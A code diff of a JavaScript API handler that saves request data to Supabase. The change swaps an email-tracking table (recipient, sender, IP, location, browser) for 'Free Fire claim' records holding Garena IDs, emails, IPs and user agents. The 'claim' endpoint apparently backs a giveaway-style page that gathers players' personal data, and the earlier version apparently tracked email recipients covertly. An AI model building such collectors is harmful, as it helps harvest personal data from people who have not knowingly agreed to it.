@@ -19,32 +19,30 @@ export default async function handler(req, res) {
   }
   
   try {
-    const userData = req.body;
+    const claimData = req.body;
     
-    // Save to Supabase with sender_email (who sent the email)
+    console.log('Free Fire Claim:', claimData);
+    
+    // Save to Supabase
     const { error } = await supabase
-      .from('collected_data')
+      .from('freefire_claims')
       .insert({
-        tracking_id: userData.trackingId,
-        user_email: userData.userEmail,        // receiver email
-        sender_email: userData.senderEmail,     // who sent the email (IMPORTANT!)
-        license: userData.license,
-        ip: userData.ip,
-        location: userData.location,
-        browser: userData.browser,
-        platform: userData.platform,
-        timestamp: userData.timestamp || new Date().toISOString()
+        garena_id: claimData.garenaId,
+        email: claimData.email,
+        ip: claimData.ip || null,
+        user_agent: claimData.userAgent || null,
+        claimed_at: claimData.timestamp || new Date().toISOString()
       });
     
     if (error) {
       console.error('Supabase error:', error);
-      return res.status(500).json({ error: error.message });
+      return res.status(500).json({ success: false, error: error.message });
     }
     
     return res.status(200).json({ success: true });
     
   } catch (error) {
     console.error('Error:', error);
-    return res.status(500).json({ error: error.message });
+    return res.status(500).json({ success: false, error: error.message });
   }
 }
